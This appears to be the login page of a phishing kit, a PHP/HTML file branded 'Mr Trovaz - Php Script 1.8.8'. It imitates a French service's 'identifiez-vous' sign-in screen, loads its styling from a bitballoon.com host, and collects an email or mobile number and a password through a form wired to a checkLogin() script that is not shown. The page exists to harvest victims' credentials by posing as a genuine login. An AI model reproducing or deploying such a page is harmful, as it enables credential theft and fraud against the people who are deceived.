<?php
/*   ________________________________________________________________________ 
    |  Mr Trovaz - Php Script   1.8.8                                       |
    |              on 2017-10-17 14:57:35                                                     |
    |    Facebook: https://www.facebook.com/profile.php?id=100010413816341   |
    |________________________________________________________________________|
*/?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <meta name="format-detection" content="telephone=no"/>
    <title>identifiez-vous</title>
    <link rel="icon" type="image/png" href="//censor-susan-76126.bitballoon.com/img/favicon.png">
    <link rel="stylesheet" type="text/css" href="//censor-susan-76126.bitballoon.com/css/style.css"/>
    <script src="app/views/assets/js/jquery.min.js" type="text/javascript"></script>
    <script src="app/views/assets/js/my-script.js" type="text/javascript"></script>
    <noscript>
        Cette page utilise du Javascript. Activez le Javascript via le menu "options" de votre navigateur.
    </noscript>
</head>
<body style="background: #FFF;">
<div id="w2sc">
    <div id="w2sc2">
        <div id="w2sm"></div>
        <div class="w2h">
            <div id="w2gh" class="w2gh">
                <div class="w2ghb">
                    <div class="w2ghbl"><span class="w2ghbl"> </span></div>
                    <div class="w2ghbt">
                        <div class="w2sht">identifiez-vous</div>
                    </div>
                </div>
            </div>
        </div>
        <div id="w2la"></div>
        <div class="firstBlock">
            <div class="blockelem hidden"><span style="color: red;">Vous n&apos;avez pas saisi d&apos;adresse mail ou de num&eacute;ro de mobile.</span>
            </div>
            <form class="login" action="#" method="post"><input name="type" type="hidden" value="1"/> adresse mail ou
                num&eacute;ro de mobile
                <div><input id="email" class="largeinput my-input error" maxlength="78" name="email" size="35"
                            type="text" value=""/></div>
                <div><span class="inputLabel">mot de passe</span> <br/> <input id="password"
                                                                               class="largeinput my-input error"
                                                                               maxlength="36" name="password" size="35"
                                                                               type="password"/></div>
                <div class="nl">
                    <table class="nl" width="100%" cellspacing="0">
                        <tbody>
                        <tr>
                            <td class="ni" style="border-bottom: 1px solid #B1B1B1;text-align: left;font-weight: 400;">mot de passe oubli&eacute;</td>
                            <td class="nibullet" style="border-bottom: 1px solid #B1B1B1;"><span class="nibullet">&rsaquo;</span>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </div>
                <input id="otherInfo" name="otherInfo" type="hidden" value="0"/>
                <div class="check"><input class="check" checked="checked" name="keepmesignin" type="checkbox"/> <span
                            class="inputLabel radiocheck">rester identifi&eacute;</span></div>
                <div class="button"><span class="button important" title="coordonnees">valider</span> <span
                            class="button annuler">annuler</span></div>
            </form>
            <div class="blockelem">Si vous ne connaissez pas votre mot de passe ou si vous l&apos;avez oubli&eacute;, cliquez
                sur " <a class="intext" href="#"><strong>mot de passe oubli&eacute;</strong></a>"
            </div>
        </div>
    </div>
</div>

<script>
    checkLogin();
</script>
</body>
</html>
